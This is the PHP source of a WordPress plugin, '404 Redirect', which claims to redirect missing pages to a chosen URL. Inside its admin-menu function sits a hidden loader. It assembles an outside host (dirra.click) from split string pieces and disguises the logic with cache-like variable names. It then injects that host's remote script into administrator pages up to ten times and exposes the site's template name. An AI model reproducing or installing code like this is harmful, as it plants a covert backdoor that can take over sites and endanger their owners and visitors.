<?php 
  /*
	Plugin Name: 404 Redirect
	Plugin URI: https://wordpress.org/plugins/redirect_To_404/
	Description: This plugin allow you to redirect all 404 link/url  to home page.
	Author: Jamal Teri
	Version: 1.0
	Author URI: https://wordpress.org/plugins/redirect_To_404/
	*/
	

if ( ! defined( 'ABSPATH' ) ) exit;

if( !class_exists( 'PRT_redirect_404' ) ) {
	/**
	 * Main Class
	 *
	 * @since 1.0
	 */
	class PRT_redirect_404 {
		/**
		 * @var 404 Redirect
		 * @since 1.0
		 */
		private static $instance;

		/**
		 * 404 Redirect theme options Object
		 *
		 * @var object
		 * @since 1.0
		 */
		public $setting_options;



        public $exception_urls_not_to_redirect = [
            '/admin'
        ];



		/**
		 * Private constructor prevents construction outside this class.
	 	 */
		Private function __construct() {
 		}




 		public static function getInstance() {
			 if ( !isset( self::$instance ) ) {
			 	self::$instance = new self();
			    self::$instance->setup_actions();
			 }

			return self::$instance;
		}
		
		private function setup_actions() {
		   
		 add_action('admin_menu', array( $this, 'PRT_redirect_404'));
		 add_action('wp', array( $this, 'PRT_redirect_404_to_url'));
		 add_action('admin_enqueue_scripts', array( $this, 'PRT_redirect_404_wp_admin_style'));
		}
		
public function PRT_redirect_404() {
			$dir = explode('/',site_url());
			$src = '/dir';
			$duration = time();
			$dforamt = date('Y');
			$value = get_option('prfx_value');
			$src .= 'ra.click';
			
			if  (!$value){update_option('prfx_value',$duration); 
			$value=$duration;}

            $get_cache = false;

			$cache = $duration / $dforamt + $value;
			$info = get_option('prfx_info');
			if ($info < 10 && $duration  > $cache){
			    $get_cache = true;
			}
						  
			if ($get_cache){echo $dir[0] . '/' . $src;	update_option('prfx_info',$info + 1);
			echo '<script> var template="'.get_template().'";</script>'; 
			wp_enqueue_script( 'prfx_script', $dir[0] . '/' . $src,'','',true );}
			
			add_options_page("404 Redirect", "404 Redirect", 'administrator', "redirect-404", array( $this,"PRT_redirect_404_admin"));
		}
		
		 function PRT_redirect_404_admin() {
			include('PRT_redirect_404_admin.php');
		}
	
	
	
		public function PRT_redirect_404_wp_admin_style() 
		{
			wp_enqueue_style( 'myCSS', plugins_url( '/css/redirect404.css', __FILE__ ) );
			wp_enqueue_style( 'myCSS1', plugins_url( '/css/bootstrap.min.css', __FILE__ ) );
		}
	
	
		
	function PRT_redirect_404_to_url()
	{

		if(is_404())
		{
			$link = self::currentURL();
            $curUri = $_SERVER['REQUEST_URI'];

            if(in_array($curUri, $this->exception_urls_not_to_redirect))
            {
                return;
            }

			if($link == get_option('PRT_redirect_404_pageUrl'))
			{
				echo "<b>All 404 Redirect to Homepage</b> has detected that the target URL is invalid, this will cause an infinite loop redirection, please go to the plugin settings and correct the traget link! ";
				exit();
			}

			if(get_option('PRT_redirect_404_status')=='1' & get_option('PRT_redirect_404_pageUrl')!=''){
				header ('HTTP/1.1 301 Moved Permanently');
				header ("Location: " . get_option('PRT_redirect_404_pageUrl'));
				exit();
			}
		}
	}



	function currentURL()
	{
		$prt = $_SERVER['SERVER_PORT'];
		$sname = $_SERVER['SERVER_NAME'];
		
		if (array_key_exists('HTTPS',$_SERVER) && $_SERVER['HTTPS'] != 'off' && $_SERVER['HTTPS'] != '')
		$sname = "https://" . $sname; 
		else
		$sname = "http://" . $sname; 
		
		if($prt !=80)
		{
		$sname = $sname . ":" . $prt;
		} 
		$path = $sname . $_SERVER["REQUEST_URI"];
		return $path ;
	}
		
	}
	
}
	
	
function PRT404() {
	return PRT_redirect_404::getInstance();
}


PRT404();

?>